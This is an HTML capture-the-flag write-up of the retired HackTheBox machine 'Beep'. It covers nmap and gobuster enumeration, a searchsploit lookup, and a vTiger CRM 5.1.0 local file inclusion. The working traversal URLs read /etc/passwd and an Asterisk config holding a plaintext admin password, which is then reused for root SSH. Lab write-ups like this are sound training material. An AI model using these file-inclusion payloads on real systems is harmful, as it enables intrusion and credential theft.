@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Beep</strong></h1>
+        <em>Released: 15th March 2017 / Pwned: 23rd September 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Beep is overwhelming because there's a lot of services running, but relatively simple if you manage to navigate through the sea of open ports. There are a few ways to solve the box, I did it the easy way.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Scan for open TCP ports:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/beep#&nbsp;nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-allports.txt&nbsp;10.10.10.7<br>
+                Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2019-09-23&nbsp;10:02&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.7<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.041s&nbsp;latency).<br>
+                Not&nbsp;shown:&nbsp;65519&nbsp;closed&nbsp;ports<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh<br>
+                25/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;smtp<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http<br>
+                110/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;pop3<br>
+                111/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind<br>
+                143/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;imap<br>
+                443/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;https<br>
+                878/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;unknown<br>
+                993/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;imaps<br>
+                995/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;pop3s<br>
+                3306/tcp&nbsp;&nbsp;open&nbsp;&nbsp;mysql<br>
+                4190/tcp&nbsp;&nbsp;open&nbsp;&nbsp;sieve<br>
+                4445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;upnotifyp<br>
+                4559/tcp&nbsp;&nbsp;open&nbsp;&nbsp;hylafax<br>
+                5038/tcp&nbsp;&nbsp;open&nbsp;&nbsp;unknown<br>
+                10000/tcp&nbsp;open&nbsp;&nbsp;snet-sensor-mgmt
+            </div>
+        </div><br>
+        <br>
+        Grep Nmap's output for the open ports<br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep#&nbsp;grep&nbsp;^[0-9]&nbsp;nmap/tcp-allports.txt&nbsp;|&nbsp;cut&nbsp;-d&nbsp;'/'&nbsp;-f&nbsp;1&nbsp;|&nbsp;tr&nbsp;'\n'&nbsp;','&nbsp;|&nbsp;sed&nbsp;s/,$//&nbsp;&gt;&nbsp;nmap/tcp-open_ports.txt<br>
+                root@gotham:~/ctf/beep#&nbsp;cat&nbsp;nmap/tcp-open_ports.txt&nbsp;<br>
+                22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000
+            </div>
+        </div><br>
+        <br>
+        And run service detection and default scripts against the open TCP ports:<br>
+        <code>-T4</code> aggressive scan<br>
+        <code>-sV</code> service enumeration<br>
+        <code>-sC</code> default scripts<br>
+        <code>-O</code> OS detection<br>
+        <code>-oN</code> default output<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep#&nbsp;nmap&nbsp;-p&nbsp;$(cat&nbsp;nmap/tcp-open_ports.txt)&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-openports.txt&nbsp;10.10.10.7<br>
+                Starting&nbsp;Nmap&nbsp;7.80&nbsp;(&nbsp;https://nmap.org&nbsp;)&nbsp;at&nbsp;2019-09-23&nbsp;10:05&nbsp;BST<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.7<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.058s&nbsp;latency).<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                22/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OpenSSH&nbsp;4.3&nbsp;(protocol&nbsp;2.0)<br>
+                |&nbsp;ssh-hostkey:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;1024&nbsp;ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53&nbsp;(DSA)<br>
+                |_&nbsp;&nbsp;2048&nbsp;bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d&nbsp;(RSA)<br>
+                25/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;smtp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Postfix&nbsp;smtpd<br>
+                |_smtp-commands:&nbsp;beep.localdomain,&nbsp;PIPELINING,&nbsp;SIZE&nbsp;10240000,&nbsp;VRFY,&nbsp;ETRN,&nbsp;ENHANCEDSTATUSCODES,&nbsp;8BITMIME,&nbsp;DSN,&nbsp;<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;httpd&nbsp;2.2.3<br>
+                |_http-server-header:&nbsp;Apache/2.2.3&nbsp;(CentOS)<br>
+                |_http-title:&nbsp;Did&nbsp;not&nbsp;follow&nbsp;redirect&nbsp;to&nbsp;https://10.10.10.7/<br>
+                |_https-redirect:&nbsp;ERROR:&nbsp;Script&nbsp;execution&nbsp;failed&nbsp;(use&nbsp;-d&nbsp;to&nbsp;debug)<br>
+                110/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;pop3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cyrus&nbsp;pop3d&nbsp;2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br>
+                |_pop3-capabilities:&nbsp;EXPIRE(NEVER)&nbsp;RESP-CODES&nbsp;PIPELINING&nbsp;USER&nbsp;APOP&nbsp;STLS&nbsp;LOGIN-DELAY(0)&nbsp;TOP&nbsp;IMPLEMENTATION(Cyrus&nbsp;POP3&nbsp;server&nbsp;v2)&nbsp;UIDL&nbsp;AUTH-RESP-CODE<br>
+                111/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;rpcbind&nbsp;&nbsp;&nbsp;&nbsp;2&nbsp;(RPC&nbsp;#100000)<br>
+                143/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;imap&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cyrus&nbsp;imapd&nbsp;2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br>
+                |_imap-capabilities:&nbsp;MULTIAPPEND&nbsp;OK&nbsp;ATOMIC&nbsp;UIDPLUS&nbsp;NAMESPACE&nbsp;NO&nbsp;SORT=MODSEQ&nbsp;URLAUTHA0001&nbsp;ACL&nbsp;QUOTA&nbsp;ID&nbsp;STARTTLS&nbsp;BINARY&nbsp;RENAME&nbsp;CONDSTORE&nbsp;IDLE&nbsp;CHILDREN&nbsp;LITERAL+&nbsp;LISTEXT&nbsp;CATENATE&nbsp;IMAP4&nbsp;ANNOTATEMORE&nbsp;THREAD=REFERENCES&nbsp;UNSELECT&nbsp;THREAD=ORDEREDSUBJECT&nbsp;IMAP4rev1&nbsp;Completed&nbsp;SORT&nbsp;RIGHTS=kxte&nbsp;X-NETSCAPE&nbsp;MAILBOX-REFERRALS&nbsp;LIST-SUBSCRIBED<br>
+                443/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssl/https?<br>
+                |_ssl-date:&nbsp;2019-09-23T09:08:40+00:00;&nbsp;-3s&nbsp;from&nbsp;scanner&nbsp;time.<br>
+                878/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;status&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;(RPC&nbsp;#100024)<br>
+                993/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ssl/imap&nbsp;&nbsp;&nbsp;Cyrus&nbsp;imapd<br>
+                |_imap-capabilities:&nbsp;CAPABILITY<br>
+                995/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;pop3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cyrus&nbsp;pop3d<br>
+                3306/tcp&nbsp;&nbsp;open&nbsp;&nbsp;mysql&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MySQL&nbsp;(unauthorized)<br>
+                4190/tcp&nbsp;&nbsp;open&nbsp;&nbsp;sieve&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cyrus&nbsp;timsieved&nbsp;2.3.7-Invoca-RPM-2.3.7-7.el5_6.4&nbsp;(included&nbsp;w/cyrus&nbsp;imap)<br>
+                4445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;upnotifyp?<br>
+                4559/tcp&nbsp;&nbsp;open&nbsp;&nbsp;hylafax&nbsp;&nbsp;&nbsp;&nbsp;HylaFAX&nbsp;4.3.10<br>
+                5038/tcp&nbsp;&nbsp;open&nbsp;&nbsp;asterisk&nbsp;&nbsp;&nbsp;Asterisk&nbsp;Call&nbsp;Manager&nbsp;1.1<br>
+                10000/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MiniServ&nbsp;1.570&nbsp;(Webmin&nbsp;httpd)<br>
+                |_http-title:&nbsp;Site&nbsp;doesn't&nbsp;have&nbsp;a&nbsp;title&nbsp;(text/html;&nbsp;Charset=iso-8859-1).
+            </div>
+        </div><br>
+        <br>
+        <strong>Results analysis:</strong><br>
+        • <code>22/ssh</code> - Useful to know for later<br>
+        • <code>25, 110, 143, 995</code> - Email! Will need credentials to access<br>
+        • <code>80/http</code> and <code>443/https</code> - Web servers! These have a big attack surface, and is where you should look first<br>
+        • <code>3306/mysql</code> - MySQL is running, but can only be logged in from localhost<br>
+        • <code>4559</code> and <code>5038</code> - HylaFAX and Asterisk hint at what software package is running on this box<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) 80/http - gobuster</strong></h2><br>
+        Visit <code>http://10.10.10.7</code><br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        Elastix is running.<br>
+        <br>
+        <strong>What is Elastix?</strong><br>
+        Elastix is collection of open source tools that helps users build a PBX - a Private Branch Exchange, which is a phone system where users can call internally within the company and externally using a shared phone line. Think call centres.<br>
+        Elastix includes PBX, IP PBX (VoIP basically), email, instant messaging, faxing and collaboration tools. This explains why there's so many services running on the box - they're all tied into Elastix.<br>
+        <br>
+        Also note by looking in the URL bar that the we've been redirected to https - <code>https://10.10.10.7</code><br>
+        <br>
+        <strong>Gobuster</strong><br>
+        Gobuster the page.<br>
+        Use <code>-k</code> to skip SSL certification.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep/80#&nbsp;gobuster&nbsp;dir&nbsp;-e&nbsp;-u&nbsp;https://10.10.10.7&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb-big.txt&nbsp;-k<br>
+                ===============================================================<br>
+                Gobuster&nbsp;v3.0.1<br>
+                by&nbsp;OJ&nbsp;Reeves&nbsp;(@TheColonial)&nbsp;&amp;&nbsp;Christian&nbsp;Mehlmauer&nbsp;(@_FireFart_)<br>
+                ===============================================================<br>
+                [+]&nbsp;Url:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://10.10.10.7<br>
+                [+]&nbsp;Threads:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10<br>
+                [+]&nbsp;Wordlist:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt<br>
+                [+]&nbsp;Status&nbsp;codes:&nbsp;&nbsp;&nbsp;200,204,301,302,307,401,403<br>
+                [+]&nbsp;User&nbsp;Agent:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gobuster/3.0.1<br>
+                [+]&nbsp;Expanded:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true<br>
+                [+]&nbsp;Timeout:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10s<br>
+                ===============================================================<br>
+                https://10.10.10.7/.htpasswd&nbsp;(Status:&nbsp;403)<br>
+                https://10.10.10.7/.htaccess&nbsp;(Status:&nbsp;403)<br>
+                https://10.10.10.7/admin&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/cgi-bin/&nbsp;(Status:&nbsp;403)<br>
+                https://10.10.10.7/configs&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/favicon.ico&nbsp;(Status:&nbsp;200)<br>
+                https://10.10.10.7/help&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/images&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/lang&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/libs&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/mail&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/modules&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/panel&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/recordings&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/robots.txt&nbsp;(Status:&nbsp;200)<br>
+                https://10.10.10.7/static&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/themes&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/var&nbsp;(Status:&nbsp;301)<br>
+                https://10.10.10.7/vtigercrm&nbsp;(Status:&nbsp;301)
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) /vtigercrm</strong></h2><br>
+        Visit <code>https://10.10.10.7/vtigercrm</code><br>
+        On the bottom right of the page, you'll find a vitger CRM version number - <code>5.1.0</code><br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        <code>searchsploit</code> for vigter CRM using the version number you just found.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep/exploits#&nbsp;searchsploit&nbsp;vtiger&nbsp;5.1<br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;Path<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;(/usr/share/exploitdb/)<br>
+                -------------------------------------------------------&nbsp;----------------------------------------<br>
+                vTiger&nbsp;CRM&nbsp;5.1.0&nbsp;-&nbsp;Local&nbsp;File&nbsp;Inclusion&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;exploits/php/webapps/18770.txt<br>
+                -------------------------------------------------------&nbsp;----------------------------------------
+            </div>
+        </div><br>
+        <br>
+        There's an LFI vulnerability for this version :)<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) vTiger 5.1 LFI</strong></h2><br>
+        <a href="https://www.exploit-db.com/exploits/18770">https://www.exploit-db.com/exploits/18770</a><br>
+        <br>
+        Visit <code>https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00</code> to grab <code>/etc/passwd</code>.<br>
+        <br>
+        The output won't be pretty because the web page isn't rendering the HTML.<br>
+        You can solve this by viewing the source - <code>Ctrl + U</code><br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Find creds with LFI</strong></h2><br>
+        We know from Nmap what services are running, so I tried to find the conf files for those services through google and read them via LFI, in the hopes of finding credentials.<br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        The top results is this - <a href="https://wiki.asterisk.org/wiki/display/AST/Directory+and+File+Structure">https://wiki.asterisk.org/wiki/display/AST/Directory+and+File+Structure</a><br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        <code>/etc/asterisk</code> contains the configuration files for Asterisk.<br>
+        Google <code>/etc/asterisk</code>, and the search suggestions reveal some files.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        In <code>/etc/asterisk/manager.conf</code>, you'll find a set of admin credentials.<br>
+        <a href="https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00">https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/asterisk/manager.conf%00</a><br>
+        <br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+            <div class="codebox">
+                [admin]<br>
+                secret&nbsp;=&nbsp;jEhdIekWmdjE<br>
+                deny=0.0.0.0/0.0.0.0<br>
+                permit=127.0.0.1/255.255.255.0
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) SSH in as root</strong></h2><br>
+        Use the password you've just found to ssh in as root.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/beep#&nbsp;ssh&nbsp;root@10.10.10.7<br>
+                root@10.10.10.7's&nbsp;password:&nbsp;jEhdIekWmdjE<br>
+                Last&nbsp;login:&nbsp;Mon&nbsp;Sep&nbsp;23&nbsp;16:28:51&nbsp;2019&nbsp;from&nbsp;10.10.14.4<br>
+                <br>
+                Welcome&nbsp;to&nbsp;Elastix&nbsp;<br>
+                ----------------------------------------------------<br>
+                <br>
+                To&nbsp;access&nbsp;your&nbsp;Elastix&nbsp;System,&nbsp;using&nbsp;a&nbsp;separate&nbsp;workstation&nbsp;(PC/MAC/Linux)<br>
+                Open&nbsp;the&nbsp;Internet&nbsp;Browser&nbsp;using&nbsp;the&nbsp;following&nbsp;URL:<br>
+                http://10.10.10.7<br>
+                <br>
+                [root@beep&nbsp;~]#&nbsp;cat&nbsp;/home/fanis/user.txt<br>
+                aeff3def0c...<br>
+                [root@beep&nbsp;~]#&nbsp;cat&nbsp;/root/root.txt<br>
+                d88e00612...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
